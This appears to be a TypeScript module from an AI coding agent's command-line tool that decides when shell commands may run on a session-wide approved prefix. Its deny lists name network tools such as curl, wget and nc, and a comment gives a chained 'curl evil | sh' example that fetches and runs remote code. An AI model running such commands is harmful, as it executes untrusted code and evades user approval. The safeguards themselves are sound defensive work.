/**
 * Session-scoped approval of simple shell command prefixes. Kept dependency-free so the CLI can
 * import it without loading the tool registry.
 *
 * Approving the prefix "npm test" lets later commands that start with exactly those words run
 * without a prompt. Extra arguments are allowed only while they stay harmless: anything that
 * points outside the workspace or switches a command into "write a file / run a program" mode
 * still asks.
 */
// Anything that can chain, substitute, redirect or group commands disqualifies a command from
// prefix approval: "npm test; curl evil | sh" must never ride on an approved "npm test".
const SHELL_META_RE = /[;&|`$<>(){}\\\n\r]/;
const LAUNCHER_SUBCOMMANDS = new Set(['run', 'exec', 'x', 'dlx', '-m']);
// Commands that run other commands or rewrite their environment: never approvable by prefix.
const ALWAYS_EXPLICIT = new Set([
  'env', 'sudo', 'doas', 'su', 'xargs', 'eval', 'exec', 'command', 'builtin', 'source', '.', 'nohup',
  'time', 'nice', 'timeout', 'watch', 'ssh', 'find', 'bash', 'sh', 'zsh', 'fish', 'dash', 'pwsh', 'powershell',
]);
// Interpreters may be approved for a specific script/module ("python -m pytest", "node build.js"),
// never as a bare single-word prefix that would cover any flag combination.
const INTERPRETERS = new Set(['python', 'python3', 'node', 'deno', 'bun', 'ruby', 'perl', 'php', 'awk', 'sed', 'git']);
// Commands whose arguments decide everything (what gets deleted, moved, downloaded, killed):
// only the exact same command line is remembered.
const EXACT_ONLY = new Set([
  'rm', 'rmdir', 'mv', 'cp', 'ln', 'chmod', 'chown', 'chgrp', 'dd', 'truncate', 'shred', 'mkfs',
  'curl', 'wget', 'scp', 'rsync', 'nc', 'ncat', 'kill', 'pkill', 'killall', 'docker', 'podman', 'kubectl',
]);
// Installing packages runs third-party install scripts: "npm install lodash" must not also cover
// "npm install some-other-package".
const PACKAGE_MANAGERS = new Set(['npm', 'pnpm', 'yarn', 'bun', 'pip', 'pip3', 'uv', 'poetry', 'cargo', 'go', 'gem', 'composer', 'apt', 'apt-get', 'pkg', 'brew', 'dnf', 'pacman']);
const INSTALL_SUBCOMMANDS = new Set(['install', 'i', 'add', 'ci', 'update', 'upgrade', 'up', 'get', 'remove', 'rm', 'uninstall', 'un', 'sync']);
// Options that make an otherwise read-only command write files, load config or run programs
// (git diff --output=..., git diff --ext-diff, git -c core.pager=..., --exec, --upload-pack ...).
const RISKY_OPTION_RE = /^--?(?:o|output|out|outfile|out-file|outdir|out-dir|output-dir|exec|ext-diff|upload-pack|receive-pack|config|c|eval|e|command|shell|pager|editor|global|prefix|target-dir|init-file|rcfile|require|r|import|loader)(?:=|$)/i;

function commandTokens(input: unknown): string[] | undefined {
  const command = input && typeof input === 'object' ? (input as { command?: unknown }).command : undefined;
  if (typeof command !== 'string') return undefined;
  const trimmed = command.trim();
  if (!trimmed || SHELL_META_RE.test(trimmed) || /["']/.test(trimmed)) return undefined;
  return trimmed.split(/\s+/);
}

/** An argument that names something outside the workspace (absolute, home-relative or `..`). */
function leavesWorkspace(token: string): boolean {
  const value = token.includes('=') ? token.slice(token.indexOf('=') + 1) : token;
  return /^(?:\/|~|[A-Za-z]:[\\/]|\\\\)/.test(value) || /(?:^|[\\/])\.\.(?:[\\/]|$)/.test(value);
}

/**
 * The command prefix a user can approve once for the rest of the session ("npm test",
 * "npm run lint", "python -m pytest", "git status"). Undefined for compound or unusual commands,
 * which always need an explicit decision. File-mutating, network and package-install commands
 * return the whole command line, so only that exact command is remembered.
 */
export function bashApprovalPrefix(input: unknown): string | undefined {
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return undefined;
  if (tokens.some(leavesWorkspace)) return undefined;
  if (EXACT_ONLY.has(tokens[0]) || (PACKAGE_MANAGERS.has(tokens[0]) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''))) {
    return tokens.join(' ');
  }
  const take = tokens.length > 2 && LAUNCHER_SUBCOMMANDS.has(tokens[1]) ? 3 : tokens.length > 1 && !tokens[1].startsWith('-') ? 2 : 1;
  if (take === 1 && INTERPRETERS.has(tokens[0])) return undefined;
  return tokens.slice(0, take).join(' ');
}

/**
 * True when the command is a simple command that starts, token by token, with an approved prefix
 * and whose extra arguments neither leave the workspace nor use a risky option.
 */
export function isApprovedBashPrefix(input: unknown, prefixes: ReadonlySet<string>): boolean {
  if (!prefixes.size) return false;
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return false;
  for (const prefix of prefixes) {
    const wanted = prefix.split(' ');
    if (wanted.length > tokens.length || !wanted.every((t, i) => tokens[i] === t)) continue;
    const extra = tokens.slice(wanted.length);
    const exactOnly = EXACT_ONLY.has(tokens[0]) || (PACKAGE_MANAGERS.has(tokens[0]) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''));
    if (exactOnly && extra.length) continue;
    if (extra.some(token => leavesWorkspace(token) || RISKY_OPTION_RE.test(token))) continue;
    return true;
  }
  return false;
}
